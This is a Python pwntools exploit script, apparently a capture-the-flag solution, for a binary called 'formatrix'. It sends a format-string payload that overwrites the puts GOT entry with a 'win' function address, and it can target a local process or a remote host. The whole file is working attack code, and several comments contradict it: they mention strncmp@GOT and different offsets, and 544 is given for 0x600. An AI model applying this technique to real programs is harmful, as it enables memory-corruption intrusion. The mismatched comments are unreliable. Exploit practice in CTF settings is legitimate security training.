from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "formatrix").resolve().__str__()
# b * printf + 166
# b *0x40131e
#
gdb_script = """
b *main+277
b *main+282
b *main+287
b *main+327
c
"""


frame_size = 0x600  # 544
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


# Get win_addr
elf = ELF("./formatrix")
win_addr: int = elf.symbols["win"]
puts_addr: int = elf.got["puts"]
print(f"The puts address is:{hex(puts_addr)}")
print(f"The win address is:{hex(win_addr)}")
print("____________________________________")


io = start()
res = io.recvuntil(delims=": ")
print("____________________________________")

top_half = win_addr & 0x00FFFF
# next number that has 40 at the end that can be added to 0x11d6 is 0x1240
bottom_half = 0x1240 - top_half
print(f"Top half is:{top_half}")
print(f"Bottom half is:{bottom_half}")

# Only lln works (guaranteed to be 8 bytes)
# 1) %11$lln writes total printed count (0x11F6) into 0x4034f8 (low 2 bytes of strncmp@GOT)
# 2) %12$hhn writes the low 1 byte of the new count (0x40 from 0x1240) into 0x4034fa (3rd byte)
# K is the offset
k = 5
payload = f"%{top_half}c%{k}$lln".encode("ascii")
payload += f"%{bottom_half}c%{k+1}$hhn".encode("ascii")
payload += p64(puts_addr)
payload += p64(puts_addr + 2)

print(f"Sending payload: {payload}")
print(f"Payload size: {len(payload)}")
io.sendline(payload)

print("____________________________________")
res = io.recvlines(2)
print(res)


# io.sendline(b"A" * frame_size)

io.interactive()
